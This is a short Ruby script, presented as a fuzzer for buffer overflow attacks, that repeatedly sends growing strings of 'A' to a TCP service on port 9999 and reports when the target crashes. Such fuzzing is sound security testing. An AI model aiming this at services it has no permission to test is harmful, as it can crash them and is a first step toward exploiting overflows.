# a Ruby Fuzzer for Buffer Overflow Attacks , Twitter @BypassASLR

require 'socket'

buffer = "A" 
host = ""
port = "9999" 
fuzz = 40 # the code is going to fuzz the program 40 times 



puts "Starting Exploit"

def send_req(host, port, buffer)




  begin



    request = buffer 


    s = TCPSocket.open(host, port)
    s.recv(1024)
    puts "Sending Payload :  #{request.size} bytes" 
    s.send(request, 0)
    s.close

  rescue Errno::ECONNREFUSED
    puts "The Target is not Running."
    exit!

  rescue Errno::ECONNRESET
    puts "Target Crashed"
    exit!
  rescue Interrupt 
    puts " Goodbye :) " 
    exit! 


  end



end

fuzz.times {|n| send_req(host, port, (buffer += buffer * n)) ; sleep 1 } 
